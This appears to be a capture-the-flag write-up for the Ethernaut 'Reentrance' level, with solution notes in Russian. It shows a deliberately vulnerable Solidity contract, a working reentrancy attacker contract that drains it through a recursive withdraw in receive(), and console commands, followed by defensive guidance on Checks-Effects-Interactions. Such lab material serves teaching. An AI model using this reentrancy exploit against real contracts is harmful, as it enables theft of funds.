![](https://ethernaut.openzeppelin.com/imgs/BigLevel10.svg)

The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

Solution:

Изначально на контракте: 0.001 Эфира. это можно понять с помощью `await getBalance(instance)`
теперь пишем код, который реализует атаку Reentrancy:
```sol 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external  view returns (uint balance);
  function donate(address _to) external payable;
}

contract PWN {
  IReentrance instance;
  address instance_addr;
  address owner = 0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5;
  constructor (address tmp_) {
    instance_addr = tmp_;
    instance = IReentrance(tmp_);
  }
  bool public first;
  function donate() external {
    (first, ) = instance_addr.call{value: 1000000000000000, gas: gasleft()}(abi.encodeWithSignature("donate(address _to)", owner));
  }

  function withdraw() external{
    instance.withdraw(1000000000000000);
  }

  uint count = 0;

  receive() external payable { 
    if(count == 1) {
      instance.withdraw(1000000000000000);
    } else {
      count += 1;
    }
  }

  function selfd() external {
    selfdestruct(payable(owner));
  }

}

```

функция `donate` почему-то не отрабатывает, но задонатить можно и через консоль: 
`await contract.donate("0x726857c67740Eb743da3418E2007Ecb3705A5340", {value:1000000000000000, from:"0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5"})`
а дальше просто вызываем `withdraw` 

___
In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

#### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).